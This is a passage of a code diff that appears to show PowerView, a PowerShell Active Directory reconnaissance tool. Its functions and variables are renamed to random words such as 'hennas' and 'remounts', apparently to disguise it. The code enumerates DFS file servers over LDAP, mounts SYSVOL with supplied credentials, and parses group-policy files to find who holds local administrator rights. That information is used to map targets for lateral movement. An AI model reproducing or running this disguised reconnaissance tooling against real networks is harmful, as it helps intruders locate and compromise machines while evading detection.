-                        $jmpdWhhC99 = $mqYZnpnj99 + 1
-                        $pBrdrIOW99 = $jmpdWhhC99 + 3
-                        $type = [bitconverter]::ToUInt32($IefZOVjV99[$jmpdWhhC99..$pBrdrIOW99],0)
-                        $ZigGWLsa99 = $pBrdrIOW99 + 1
-                        $eTUDuFyG99 = $ZigGWLsa99 + 3
-                        $state = [bitconverter]::ToUInt32($IefZOVjV99[$ZigGWLsa99..$eTUDuFyG99],0)
-                        $soumzfUU99 = $eTUDuFyG99 + 1
-                        $FveDLHHq99 = $soumzfUU99 + 1
-                        $jtdhZPca99 = [bitconverter]::ToUInt16($IefZOVjV99[$soumzfUU99..$FveDLHHq99],0)
-                        $OKTMtSTT99 = $FveDLHHq99 + 1
-                        $IkrgZLam99 = $OKTMtSTT99 + $jtdhZPca99 - 1
-                        if ($jtdhZPca99 -gt 0)  {
-                            $qLFuHKiz99 = [System.Text.Encoding]::Unicode.GetString($IefZOVjV99[$OKTMtSTT99..$IkrgZLam99])
+                        $root_or_link_guid_start = 0
+                        $root_or_link_guid_end = 15
+                        $root_or_link_guid = [byte[]]$blob_data[$root_or_link_guid_start..$root_or_link_guid_end]
+                        $guid = New-Object Guid(,$root_or_link_guid) # should match $guid_str
+                        $prefix_size_start = $root_or_link_guid_end + 1
+                        $prefix_size_end = $prefix_size_start + 1
+                        $prefix_size = [bitconverter]::ToUInt16($blob_data[$prefix_size_start..$prefix_size_end],0)
+                        $prefix_start = $prefix_size_end + 1
+                        $prefix_end = $prefix_start + $prefix_size - 1
+                        $prefix = [System.Text.Encoding]::Unicode.GetString($blob_data[$prefix_start..$prefix_end])
+                        $short_prefix_size_start = $prefix_end + 1
+                        $short_prefix_size_end = $short_prefix_size_start + 1
+                        $short_prefix_size = [bitconverter]::ToUInt16($blob_data[$short_prefix_size_start..$short_prefix_size_end],0)
+                        $short_prefix_start = $short_prefix_size_end + 1
+                        $short_prefix_end = $short_prefix_start + $short_prefix_size - 1
+                        $short_prefix = [System.Text.Encoding]::Unicode.GetString($blob_data[$short_prefix_start..$short_prefix_end])
+                        $type_start = $short_prefix_end + 1
+                        $type_end = $type_start + 3
+                        $type = [bitconverter]::ToUInt32($blob_data[$type_start..$type_end],0)
+                        $state_start = $type_end + 1
+                        $state_end = $state_start + 3
+                        $state = [bitconverter]::ToUInt32($blob_data[$state_start..$state_end],0)
+                        $comment_size_start = $state_end + 1
+                        $comment_size_end = $comment_size_start + 1
+                        $comment_size = [bitconverter]::ToUInt16($blob_data[$comment_size_start..$comment_size_end],0)
+                        $comment_start = $comment_size_end + 1
+                        $comment_end = $comment_start + $comment_size - 1
+                        if ($comment_size -gt 0)  {
+                            $comment = [System.Text.Encoding]::Unicode.GetString($blob_data[$comment_start..$comment_end])
                         }
-                        $SmPXXMJs99 = $IkrgZLam99 + 1
-                        $cxXlcgSb99 = $SmPXXMJs99 + 7
-                        $qrbeZsyG99 = $IefZOVjV99[$SmPXXMJs99..$cxXlcgSb99] #dword lowDateTime #dword highdatetime
-                        $EXwZUvSp99 = $cxXlcgSb99 + 1
-                        $BbVpDcrZ99 = $EXwZUvSp99 + 7
-                        $BNBOQUCG99 = $IefZOVjV99[$EXwZUvSp99..$BbVpDcrZ99]
-                        $aArMZXnE99 = $BbVpDcrZ99 + 1
-                        $KwnKUwJD99 = $aArMZXnE99 + 7
-                        $KOvjuCsK99 = $IefZOVjV99[$aArMZXnE99..$KwnKUwJD99]
-                        $OAxrgPSt99 = $KwnKUwJD99  + 1
-                        $SsNqgRNc99 = $OAxrgPSt99 + 3
-                        $qSIaVQrH99 = [bitconverter]::ToUInt32($IefZOVjV99[$OAxrgPSt99..$SsNqgRNc99],0)
-                        $nuBBAaAf99 = $SsNqgRNc99 + 1
-                        $DeueCIXC99 = $nuBBAaAf99 + 3
-                        $SfvufjUQ99 = [bitconverter]::ToUInt32($IefZOVjV99[$nuBBAaAf99..$DeueCIXC99],0)
-                        $eQwmRdlm99 = $DeueCIXC99 + 1
-                        $MNLhUkCk99 = $eQwmRdlm99 + $SfvufjUQ99 - 1
-                        $gHAhdaVY99 = $IefZOVjV99[$eQwmRdlm99..$MNLhUkCk99]
-                        $DkDnngZI99 = $MNLhUkCk99 + 1
-                        $rVkHixjD99 = $DkDnngZI99 + 3
-                        $AueUiwBI99 = [bitconverter]::ToUInt32($IefZOVjV99[$DkDnngZI99..$rVkHixjD99],0)
-                        $cgpbOLZt99 = $rVkHixjD99 + 1
-                        $hnOfEhXU99 = $cgpbOLZt99 + $AueUiwBI99 - 1
-                        $pPWFxVbM99 = $IefZOVjV99[$cgpbOLZt99..$hnOfEhXU99]
-                        $pkuaSjLn99 = $hnOfEhXU99 + 1
-                        $lqdAmDHt99 = $pkuaSjLn99 + 3
-                        $OAmMnqTm99 = [bitconverter]::ToUInt32($IefZOVjV99[$pkuaSjLn99..$lqdAmDHt99],0)
-                        $LJOuBZwq99 = 0
-                        $bZYydlLz99 = $LJOuBZwq99 + 3
-                        $AieGmuft99 = [bitconverter]::ToUInt32($gHAhdaVY99[$LJOuBZwq99..$bZYydlLz99],0)
-                        $ukvFdusY99 = $bZYydlLz99 + 1
-                        for($j=1; $j -le $AieGmuft99; $j++){
-                            $vOAekUsn99 = $ukvFdusY99
-                            $XNAyOfPa99 = $vOAekUsn99 + 3
-                            $uPvgtagO99 = [bitconverter]::ToUInt32($gHAhdaVY99[$vOAekUsn99..$XNAyOfPa99],0)
-                            $CZKXxXQX99 = $XNAyOfPa99 + 1
-                            $UAuqRucg99 = $CZKXxXQX99 + 7
-                            $NWNgTxpZ99 = $gHAhdaVY99[$CZKXxXQX99..$UAuqRucg99]
-                            $cMcnARJB99 = $UAuqRucg99 + 1
-                            $KVFaRWCH99 = $cMcnARJB99 + 3
-                            $FjpOWYYD99 = [bitconverter]::ToUInt32($gHAhdaVY99[$cMcnARJB99..$KVFaRWCH99],0)
-                            $EFjlvywl99 = $KVFaRWCH99 + 1
-                            $jCDmjAdt99 = $EFjlvywl99 + 3
-                            $WFzdaMIE99 = [bitconverter]::ToUInt32($gHAhdaVY99[$EFjlvywl99..$jCDmjAdt99],0)
-                            $FVjSIZcL99 = $jCDmjAdt99 + 1
-                            $QXMgYIyJ99 = $FVjSIZcL99 + 1
-                            $oXkSRoAM99 = [bitconverter]::ToUInt16($gHAhdaVY99[$FVjSIZcL99..$QXMgYIyJ99],0)
-                            $zaJZsGRN99 = $QXMgYIyJ99 + 1
-                            $HgpNyBnp99 = $zaJZsGRN99 + $oXkSRoAM99 - 1
-                            $kwscAjdo99 = [System.Text.Encoding]::Unicode.GetString($gHAhdaVY99[$zaJZsGRN99..$HgpNyBnp99])
-                            $eldLsEpl99 = $HgpNyBnp99 + 1
-                            $mwTZLmvo99 = $eldLsEpl99 + 1
-                            $poTRdgZq99 = [bitconverter]::ToUInt16($gHAhdaVY99[$eldLsEpl99..$mwTZLmvo99],0)
-                            $bPQRqisv99 = $mwTZLmvo99 + 1
-                            $GSnYyCmM99 = $bPQRqisv99 + $poTRdgZq99 - 1
-                            $yFJWGehh99 = [System.Text.Encoding]::Unicode.GetString($gHAhdaVY99[$bPQRqisv99..$GSnYyCmM99])
-                            $RnyMvCme99 += "\\$kwscAjdo99\$yFJWGehh99"
-                            $ukvFdusY99 = $GSnYyCmM99 + 1
+                        $prefix_timestamp_start = $comment_end + 1
+                        $prefix_timestamp_end = $prefix_timestamp_start + 7
+                        $prefix_timestamp = $blob_data[$prefix_timestamp_start..$prefix_timestamp_end] #dword lowDateTime #dword highdatetime
+                        $state_timestamp_start = $prefix_timestamp_end + 1
+                        $state_timestamp_end = $state_timestamp_start + 7
+                        $state_timestamp = $blob_data[$state_timestamp_start..$state_timestamp_end]
+                        $comment_timestamp_start = $state_timestamp_end + 1
+                        $comment_timestamp_end = $comment_timestamp_start + 7
+                        $comment_timestamp = $blob_data[$comment_timestamp_start..$comment_timestamp_end]
+                        $version_start = $comment_timestamp_end  + 1
+                        $version_end = $version_start + 3
+                        $version = [bitconverter]::ToUInt32($blob_data[$version_start..$version_end],0)
+                        $dfs_targetlist_blob_size_start = $version_end + 1
+                        $dfs_targetlist_blob_size_end = $dfs_targetlist_blob_size_start + 3
+                        $dfs_targetlist_blob_size = [bitconverter]::ToUInt32($blob_data[$dfs_targetlist_blob_size_start..$dfs_targetlist_blob_size_end],0)
+                        $dfs_targetlist_blob_start = $dfs_targetlist_blob_size_end + 1
+                        $dfs_targetlist_blob_end = $dfs_targetlist_blob_start + $dfs_targetlist_blob_size - 1
+                        $dfs_targetlist_blob = $blob_data[$dfs_targetlist_blob_start..$dfs_targetlist_blob_end]
+                        $reserved_blob_size_start = $dfs_targetlist_blob_end + 1
+                        $reserved_blob_size_end = $reserved_blob_size_start + 3
+                        $reserved_blob_size = [bitconverter]::ToUInt32($blob_data[$reserved_blob_size_start..$reserved_blob_size_end],0)
+                        $reserved_blob_start = $reserved_blob_size_end + 1
+                        $reserved_blob_end = $reserved_blob_start + $reserved_blob_size - 1
+                        $reserved_blob = $blob_data[$reserved_blob_start..$reserved_blob_end]
+                        $referral_ttl_start = $reserved_blob_end + 1
+                        $referral_ttl_end = $referral_ttl_start + 3
+                        $referral_ttl = [bitconverter]::ToUInt32($blob_data[$referral_ttl_start..$referral_ttl_end],0)
+                        $target_count_start = 0
+                        $target_count_end = $target_count_start + 3
+                        $target_count = [bitconverter]::ToUInt32($dfs_targetlist_blob[$target_count_start..$target_count_end],0)
+                        $t_offset = $target_count_end + 1
+                        for($j=1; $j -le $target_count; $j++){
+                            $target_entry_size_start = $t_offset
+                            $target_entry_size_end = $target_entry_size_start + 3
+                            $target_entry_size = [bitconverter]::ToUInt32($dfs_targetlist_blob[$target_entry_size_start..$target_entry_size_end],0)
+                            $target_time_stamp_start = $target_entry_size_end + 1
+                            $target_time_stamp_end = $target_time_stamp_start + 7
+                            $target_time_stamp = $dfs_targetlist_blob[$target_time_stamp_start..$target_time_stamp_end]
+                            $target_state_start = $target_time_stamp_end + 1
+                            $target_state_end = $target_state_start + 3
+                            $target_state = [bitconverter]::ToUInt32($dfs_targetlist_blob[$target_state_start..$target_state_end],0)
+                            $target_type_start = $target_state_end + 1
+                            $target_type_end = $target_type_start + 3
+                            $target_type = [bitconverter]::ToUInt32($dfs_targetlist_blob[$target_type_start..$target_type_end],0)
+                            $server_name_size_start = $target_type_end + 1
+                            $server_name_size_end = $server_name_size_start + 1
+                            $server_name_size = [bitconverter]::ToUInt16($dfs_targetlist_blob[$server_name_size_start..$server_name_size_end],0)
+                            $server_name_start = $server_name_size_end + 1
+                            $server_name_end = $server_name_start + $server_name_size - 1
+                            $server_name = [System.Text.Encoding]::Unicode.GetString($dfs_targetlist_blob[$server_name_start..$server_name_end])
+                            $share_name_size_start = $server_name_end + 1
+                            $share_name_size_end = $share_name_size_start + 1
+                            $share_name_size = [bitconverter]::ToUInt16($dfs_targetlist_blob[$share_name_size_start..$share_name_size_end],0)
+                            $share_name_start = $share_name_size_end + 1
+                            $share_name_end = $share_name_start + $share_name_size - 1
+                            $share_name = [System.Text.Encoding]::Unicode.GetString($dfs_targetlist_blob[$share_name_start..$share_name_end])
+                            $target_list += "\\$server_name\$share_name"
+                            $t_offset = $share_name_end + 1
                         }
                     }
                 }
-                $KUsFrgdb99 = $FiBatLhP99 + 1
-                $HJllWECt99 = @{
-                    'Name' = $RAYiDLuN99
-                    'Prefix' = $gPrWsTWy99
-                    'TargetList' = $RnyMvCme99
+                $offset = $blob_data_end + 1
+                $dfs_pkt_properties = @{
+                    'Name' = $blob_name
+                    'Prefix' = $prefix
+                    'TargetList' = $target_list
                 }
-                $WgKYvPMi99 += New-Object -TypeName PSObject -Property $HJllWECt99
-                $gPrWsTWy99 = $Null
-                $RAYiDLuN99 = $Null
-                $RnyMvCme99 = $Null
+                $object_list += New-Object -TypeName PSObject -Property $dfs_pkt_properties
+                $prefix = $Null
+                $blob_name = $Null
+                $target_list = $Null
             }
-            $VEbLEAEn99 = @()
-            $WgKYvPMi99 | ForEach-Object {
+            $servers = @()
+            $object_list | ForEach-Object {
                 if ($_.TargetList) {
                     $_.TargetList | ForEach-Object {
-                        $VEbLEAEn99 += $_.split('\')[2]
+                        $servers += $_.split('\')[2]
                     }
                 }
             }
-            $VEbLEAEn99
+            $servers
         }
-        function electronica {
+        function hennas {
             [CmdletBinding()]
             Param(
                 [String]
-                $SSNUOPgW99,
+                $Domain,
                 [String]
-                $FNgTGwmR99,
+                $SearchBase,
                 [String]
-                $mSxqoOjK99,
+                $Server,
                 [String]
-                $vaSWXjPs99 = 'Subtree',
+                $SearchScope = 'Subtree',
                 [Int]
-                $mhcqrrQn99 = 200,
+                $ResultPageSize = 200,
                 [Int]
-                $mvTbAWDU99,
+                $ServerTimeLimit,
                 [Switch]
-                $rPozaKft99,
+                $Tombstone,
                 [Management.Automation.PSCredential]
                 [Management.Automation.CredentialAttribute()]
-                $gxazvivN99 = [Management.Automation.PSCredential]::Empty
+                $Credential = [Management.Automation.PSCredential]::Empty
             )
-            $GdhysMOY99 = watersides @PSBoundParameters
-            if ($GdhysMOY99) {
-                $poblVMMY99 = @()
-                $GdhysMOY99.filter = '(&(objectClass=fTDfs))'
+            $DFSsearcher = deadly @PSBoundParameters
+            if ($DFSsearcher) {
+                $DFSshares = @()
+                $DFSsearcher.filter = '(&(objectClass=fTDfs))'
                 try {
-                    $pfqXXMQd99 = $GdhysMOY99.FindAll()
-                    $pfqXXMQd99 | Where-Object {$_} | ForEach-Object {
-                        $SdzJuWMG99 = $_.Properties
-                        $PTxpSoVG99 = $SdzJuWMG99.remoteservername
-                        $Pkt = $SdzJuWMG99.pkt
-                        $poblVMMY99 += $PTxpSoVG99 | ForEach-Object {
+                    $Results = $DFSSearcher.FindAll()
+                    $Results | Where-Object {$_} | ForEach-Object {
+                        $Properties = $_.Properties
+                        $RemoteNames = $Properties.remoteservername
+                        $Pkt = $Properties.pkt
+                        $DFSshares += $RemoteNames | ForEach-Object {
                             try {
                                 if ( $_.Contains('\') ) {
-                                    New-Object -TypeName PSObject -Property @{'Name'=$SdzJuWMG99.name[0];'RemoteServerName'=$_.split('\')[2]}
+                                    New-Object -TypeName PSObject -Property @{'Name'=$Properties.name[0];'RemoteServerName'=$_.split('\')[2]}
                                 }
                             }
                             catch {
-                                Write-Verbose "[wheezes] electronica error in parsing DFS share : $_"
+                                Write-Verbose "[throwaways] hennas error in parsing DFS share : $_"
                             }
                         }
                     }
-                    if ($pfqXXMQd99) {
-                        try { $pfqXXMQd99.dispose() }
+                    if ($Results) {
+                        try { $Results.dispose() }
                         catch {
-                            Write-Verbose "[wheezes] electronica error disposing of the Results object: $_"
+                            Write-Verbose "[throwaways] hennas error disposing of the Results object: $_"
                         }
                     }
-                    $GdhysMOY99.dispose()
+                    $DFSSearcher.dispose()
                     if ($pkt -and $pkt[0]) {
-                        nubile $pkt[0] | ForEach-Object {
+                        stylists $pkt[0] | ForEach-Object {
                             if ($_ -ne 'null') {
-                                New-Object -TypeName PSObject -Property @{'Name'=$SdzJuWMG99.name[0];'RemoteServerName'=$_}
+                                New-Object -TypeName PSObject -Property @{'Name'=$Properties.name[0];'RemoteServerName'=$_}
                             }
                         }
                     }
                 }
                 catch {
-                    Write-Warning "[wheezes] electronica error : $_"
+                    Write-Warning "[throwaways] hennas error : $_"
                 }
-                $poblVMMY99 | Sort-Object -Unique -Property 'RemoteServerName'
+                $DFSshares | Sort-Object -Unique -Property 'RemoteServerName'
             }
         }
-        function inamoratas {
+        function verbiage {
             [CmdletBinding()]
             Param(
                 [String]
-                $SSNUOPgW99,
+                $Domain,
                 [String]
-                $FNgTGwmR99,
+                $SearchBase,
                 [String]
-                $mSxqoOjK99,
+                $Server,
                 [String]
-                $vaSWXjPs99 = 'Subtree',
+                $SearchScope = 'Subtree',
                 [Int]
-                $mhcqrrQn99 = 200,
+                $ResultPageSize = 200,
                 [Int]
-                $mvTbAWDU99,
+                $ServerTimeLimit,
                 [Switch]
-                $rPozaKft99,
+                $Tombstone,
                 [Management.Automation.PSCredential]
                 [Management.Automation.CredentialAttribute()]
-                $gxazvivN99 = [Management.Automation.PSCredential]::Empty
+                $Credential = [Management.Automation.PSCredential]::Empty
             )
-            $GdhysMOY99 = watersides @PSBoundParameters
-            if ($GdhysMOY99) {
-                $poblVMMY99 = @()
-                $GdhysMOY99.filter = '(&(objectClass=msDFS-Linkv2))'
-                $Null = $GdhysMOY99.PropertiesToLoad.AddRange(('msdfs-linkpathv2','msDFS-TargetListv2'))
+            $DFSsearcher = deadly @PSBoundParameters
+            if ($DFSsearcher) {
+                $DFSshares = @()
+                $DFSsearcher.filter = '(&(objectClass=msDFS-Linkv2))'
+                $Null = $DFSSearcher.PropertiesToLoad.AddRange(('msdfs-linkpathv2','msDFS-TargetListv2'))
                 try {
-                    $pfqXXMQd99 = $GdhysMOY99.FindAll()
-                    $pfqXXMQd99 | Where-Object {$_} | ForEach-Object {
-                        $SdzJuWMG99 = $_.Properties
-                        $RnyMvCme99 = $SdzJuWMG99.'msdfs-targetlistv2'[0]
-                        $xml = [xml][System.Text.Encoding]::Unicode.GetString($RnyMvCme99[2..($RnyMvCme99.Length-1)])
-                        $poblVMMY99 += $xml.targets.ChildNodes | ForEach-Object {
+                    $Results = $DFSSearcher.FindAll()
+                    $Results | Where-Object {$_} | ForEach-Object {
+                        $Properties = $_.Properties
+                        $target_list = $Properties.'msdfs-targetlistv2'[0]
+                        $xml = [xml][System.Text.Encoding]::Unicode.GetString($target_list[2..($target_list.Length-1)])
+                        $DFSshares += $xml.targets.ChildNodes | ForEach-Object {
                             try {
-                                $qOvqvoXv99 = $_.InnerText
-                                if ( $qOvqvoXv99.Contains('\') ) {
-                                    $exPsVEUO99 = $qOvqvoXv99.split('\')[3]
-                                    $cjvROwQJ99 = $SdzJuWMG99.'msdfs-linkpathv2'[0]
-                                    New-Object -TypeName PSObject -Property @{'Name'="$exPsVEUO99$cjvROwQJ99";'RemoteServerName'=$qOvqvoXv99.split('\')[2]}
+                                $Target = $_.InnerText
+                                if ( $Target.Contains('\') ) {
+                                    $DFSroot = $Target.split('\')[3]
+                                    $ShareName = $Properties.'msdfs-linkpathv2'[0]
+                                    New-Object -TypeName PSObject -Property @{'Name'="$DFSroot$ShareName";'RemoteServerName'=$Target.split('\')[2]}
                                 }
                             }
                             catch {
-                                Write-Verbose "[wheezes] inamoratas error in parsing target : $_"
+                                Write-Verbose "[throwaways] verbiage error in parsing target : $_"
                             }
                         }
                     }
-                    if ($pfqXXMQd99) {
-                        try { $pfqXXMQd99.dispose() }
+                    if ($Results) {
+                        try { $Results.dispose() }
                         catch {
-                            Write-Verbose "[wheezes] Error disposing of the Results object: $_"
+                            Write-Verbose "[throwaways] Error disposing of the Results object: $_"
                         }
                     }
-                    $GdhysMOY99.dispose()
+                    $DFSSearcher.dispose()
                 }
                 catch {
-                    Write-Warning "[wheezes] inamoratas error : $_"
+                    Write-Warning "[throwaways] verbiage error : $_"
                 }
-                $poblVMMY99 | Sort-Object -Unique -Property 'RemoteServerName'
+                $DFSshares | Sort-Object -Unique -Property 'RemoteServerName'
             }
         }
     }
     PROCESS {
-        $poblVMMY99 = @()
+        $DFSshares = @()
         if ($PSBoundParameters['Domain']) {
-            ForEach ($IayDthuO99 in $SSNUOPgW99) {
-                $PPosolen99['Domain'] = $IayDthuO99
-                if ($qSIaVQrH99 -match 'all|1') {
-                    $poblVMMY99 += electronica @SearcherArguments
+            ForEach ($TargetDomain in $Domain) {
+                $SearcherArguments['Domain'] = $TargetDomain
+                if ($Version -match 'all|1') {
+                    $DFSshares += hennas @SearcherArguments
                 }
-                if ($qSIaVQrH99 -match 'all|2') {
-                    $poblVMMY99 += inamoratas @SearcherArguments
+                if ($Version -match 'all|2') {
+                    $DFSshares += verbiage @SearcherArguments
                 }
             }
         }
         else {
-            if ($qSIaVQrH99 -match 'all|1') {
-                $poblVMMY99 += electronica @SearcherArguments
+            if ($Version -match 'all|1') {
+                $DFSshares += hennas @SearcherArguments
             }
-            if ($qSIaVQrH99 -match 'all|2') {
-                $poblVMMY99 += inamoratas @SearcherArguments
+            if ($Version -match 'all|2') {
+                $DFSshares += verbiage @SearcherArguments
             }
         }
-        $poblVMMY99 | Sort-Object -Property ('RemoteServerName','Name') -Unique
+        $DFSshares | Sort-Object -Property ('RemoteServerName','Name') -Unique
     }
 }
-function Tuscon {
+function remounts {
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
     [OutputType([Hashtable])]
     [CmdletBinding()]
@@ -6078,54 +6078,54 @@ function Tuscon {
         [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
         [Alias('gpcfilesyspath', 'Path')]
         [String]
-        $CnoFYxhs99,
+        $GptTmplPath,
         [Switch]
-        $sYroqMOX99,
+        $OutputObject,
         [Management.Automation.PSCredential]
         [Management.Automation.CredentialAttribute()]
-        $gxazvivN99 = [Management.Automation.PSCredential]::Empty
+        $Credential = [Management.Automation.PSCredential]::Empty
     )
     BEGIN {
-        $ECmrxjxB99 = @{}
+        $MappedPaths = @{}
     }
     PROCESS {
         try {
-            if (($CnoFYxhs99 -Match '\\\\.*\\.*') -and ($PSBoundParameters['Credential'])) {
-                $lnulgfng99 = "\\$((New-Object System.Uri($CnoFYxhs99)).Host)\SYSVOL"
-                if (-not $ECmrxjxB99[$lnulgfng99]) {
-                    distinctively -Path $lnulgfng99 -Credential $gxazvivN99
-                    $ECmrxjxB99[$lnulgfng99] = $True
+            if (($GptTmplPath -Match '\\\\.*\\.*') -and ($PSBoundParameters['Credential'])) {
+                $SysVolPath = "\\$((New-Object System.Uri($GptTmplPath)).Host)\SYSVOL"
+                if (-not $MappedPaths[$SysVolPath]) {
+                    depicting -Path $SysVolPath -Credential $Credential
+                    $MappedPaths[$SysVolPath] = $True
                 }
             }
-            $myGccuLL99 = $CnoFYxhs99
-            if (-not $myGccuLL99.EndsWith('.inf')) {
-                $myGccuLL99 += '\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf'
+            $TargetGptTmplPath = $GptTmplPath
+            if (-not $TargetGptTmplPath.EndsWith('.inf')) {
+                $TargetGptTmplPath += '\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf'
             }
-            Write-Verbose "[Tuscon] Parsing GptTmplPath: $myGccuLL99"
+            Write-Verbose "[remounts] Parsing GptTmplPath: $TargetGptTmplPath"
             if ($PSBoundParameters['OutputObject']) {
-                $CMEVrSig99 = intriguingly -Path $myGccuLL99 -OutputObject -ErrorAction Stop
-                if ($CMEVrSig99) {
-                    $CMEVrSig99 | Add-Member Noteproperty 'Path' $myGccuLL99
-                    $CMEVrSig99
+                $Contents = archers -Path $TargetGptTmplPath -OutputObject -ErrorAction Stop
+                if ($Contents) {
+                    $Contents | Add-Member Noteproperty 'Path' $TargetGptTmplPath
+                    $Contents
                 }
             }
             else {
-                $CMEVrSig99 = intriguingly -Path $myGccuLL99 -ErrorAction Stop
-                if ($CMEVrSig99) {
-                    $CMEVrSig99['Path'] = $myGccuLL99
-                    $CMEVrSig99
+                $Contents = archers -Path $TargetGptTmplPath -ErrorAction Stop
+                if ($Contents) {
+                    $Contents['Path'] = $TargetGptTmplPath
+                    $Contents
                 }
             }
         }
         catch {
-            Write-Verbose "[Tuscon] Error parsing $myGccuLL99 : $_"
+            Write-Verbose "[remounts] Error parsing $TargetGptTmplPath : $_"
         }
     }
     END {
-        $ECmrxjxB99.Keys | ForEach-Object { reeling -Path $_ }
+        $MappedPaths.Keys | ForEach-Object { withdrew -Path $_ }
     }
 }
-function Peiping {
+function embroidered {
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
     [OutputType('PowerView.GroupsXML')]
     [CmdletBinding()]
@@ -6133,81 +6133,81 @@ function Peiping {
         [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
         [Alias('Path')]
         [String]
-        $wRjDwLau99,
+        $GroupsXMLPath,
         [Management.Automation.PSCredential]
         [Management.Automation.CredentialAttribute()]
-        $gxazvivN99 = [Management.Automation.PSCredential]::Empty
+        $Credential = [Management.Automation.PSCredential]::Empty
     )
     BEGIN {
-        $ECmrxjxB99 = @{}
+        $MappedPaths = @{}
     }
     PROCESS {
         try {
-            if (($wRjDwLau99 -Match '\\\\.*\\.*') -and ($PSBoundParameters['Credential'])) {
-                $lnulgfng99 = "\\$((New-Object System.Uri($wRjDwLau99)).Host)\SYSVOL"
-                if (-not $ECmrxjxB99[$lnulgfng99]) {
-                    distinctively -Path $lnulgfng99 -Credential $gxazvivN99
-                    $ECmrxjxB99[$lnulgfng99] = $True
+            if (($GroupsXMLPath -Match '\\\\.*\\.*') -and ($PSBoundParameters['Credential'])) {
+                $SysVolPath = "\\$((New-Object System.Uri($GroupsXMLPath)).Host)\SYSVOL"
+                if (-not $MappedPaths[$SysVolPath]) {
+                    depicting -Path $SysVolPath -Credential $Credential
+                    $MappedPaths[$SysVolPath] = $True
                 }
             }
-            [XML]$eODbVEwq99 = Get-Content -Path $wRjDwLau99 -ErrorAction Stop
-            $eODbVEwq99 | Select-Xml "/Groups/Group" | Select-Object -ExpandProperty node | ForEach-Object {
-                $SZjbzmKX99 = $_.Properties.groupName
-                $LmXmVdGr99 = $_.Properties.groupSid
-                if (-not $LmXmVdGr99) {
-                    if ($SZjbzmKX99 -match 'Administrators') {
-                        $LmXmVdGr99 = 'S-1-5-32-544'
+            [XML]$GroupsXMLcontent = Get-Content -Path $GroupsXMLPath -ErrorAction Stop
+            $GroupsXMLcontent | Select-Xml "/Groups/Group" | Select-Object -ExpandProperty node | ForEach-Object {
+                $Groupname = $_.Properties.groupName
+                $GroupSID = $_.Properties.groupSid
+                if (-not $GroupSID) {
+                    if ($Groupname -match 'Administrators') {
+                        $GroupSID = 'S-1-5-32-544'
                     }
-                    elseif ($SZjbzmKX99 -match 'Remote Desktop') {
-                        $LmXmVdGr99 = 'S-1-5-32-555'
+                    elseif ($Groupname -match 'Remote Desktop') {
+                        $GroupSID = 'S-1-5-32-555'
                     }
-                    elseif ($SZjbzmKX99 -match 'Guests') {
-                        $LmXmVdGr99 = 'S-1-5-32-546'
+                    elseif ($Groupname -match 'Guests') {
+                        $GroupSID = 'S-1-5-32-546'
                     }
                     else {
                         if ($PSBoundParameters['Credential']) {
-                            $LmXmVdGr99 = gain -ObjectName $SZjbzmKX99 -Credential $gxazvivN99
+                            $GroupSID = concurs -ObjectName $Groupname -Credential $Credential
                         }
                         else {
-                            $LmXmVdGr99 = gain -ObjectName $SZjbzmKX99
+                            $GroupSID = concurs -ObjectName $Groupname
                         }
                     }
                 }
-                $SvCMbRzc99 = $_.Properties.members | Select-Object -ExpandProperty Member | Where-Object { $_.action -match 'ADD' } | ForEach-Object {
+                $Members = $_.Properties.members | Select-Object -ExpandProperty Member | Where-Object { $_.action -match 'ADD' } | ForEach-Object {
                     if ($_.sid) { $_.sid }
                     else { $_.name }
                 }
-                if ($SvCMbRzc99) {
+                if ($Members) {
                     if ($_.filters) {
-                        $kqlIQisk99 = $_.filters.GetEnumerator() | ForEach-Object {
+                        $Filters = $_.filters.GetEnumerator() | ForEach-Object {
                             New-Object -TypeName PSObject -Property @{'Type' = $_.LocalName;'Value' = $_.name}
                         }
                     }
                     else {
-                        $kqlIQisk99 = $Null
+                        $Filters = $Null
                     }
-                    if ($SvCMbRzc99 -isnot [System.Array]) { $SvCMbRzc99 = @($SvCMbRzc99) }
-                    $gxgEsjTt99 = New-Object PSObject
-                    $gxgEsjTt99 | Add-Member Noteproperty 'GPOPath' $dPbUrfIe99
-                    $gxgEsjTt99 | Add-Member Noteproperty 'Filters' $kqlIQisk99
-                    $gxgEsjTt99 | Add-Member Noteproperty 'GroupName' $SZjbzmKX99
-                    $gxgEsjTt99 | Add-Member Noteproperty 'GroupSID' $LmXmVdGr99
-                    $gxgEsjTt99 | Add-Member Noteproperty 'GroupMemberOf' $Null
-                    $gxgEsjTt99 | Add-Member Noteproperty 'GroupMembers' $SvCMbRzc99
-                    $gxgEsjTt99.PSObject.TypeNames.Insert(0, 'PowerView.GroupsXML')
-                    $gxgEsjTt99
+                    if ($Members -isnot [System.Array]) { $Members = @($Members) }
+                    $GroupsXML = New-Object PSObject
+                    $GroupsXML | Add-Member Noteproperty 'GPOPath' $TargetGroupsXMLPath
+                    $GroupsXML | Add-Member Noteproperty 'Filters' $Filters
+                    $GroupsXML | Add-Member Noteproperty 'GroupName' $GroupName
+                    $GroupsXML | Add-Member Noteproperty 'GroupSID' $GroupSID
+                    $GroupsXML | Add-Member Noteproperty 'GroupMemberOf' $Null
+                    $GroupsXML | Add-Member Noteproperty 'GroupMembers' $Members
+                    $GroupsXML.PSObject.TypeNames.Insert(0, 'PowerView.GroupsXML')
+                    $GroupsXML
                 }
             }
         }
         catch {
-            Write-Verbose "[Peiping] Error parsing $dPbUrfIe99 : $_"
+            Write-Verbose "[embroidered] Error parsing $TargetGroupsXMLPath : $_"
         }
     }
     END {
-        $ECmrxjxB99.Keys | ForEach-Object { reeling -Path $_ }
+        $MappedPaths.Keys | ForEach-Object { withdrew -Path $_ }
     }
 }
-function roomfuls {
+function meshed {
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
     [OutputType('PowerView.GPO')]
@@ -6217,119 +6217,119 @@ function roomfuls {
         [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
         [Alias('DistinguishedName', 'SamAccountName', 'Name')]
         [String[]]
-        $BfpbWwpi99,
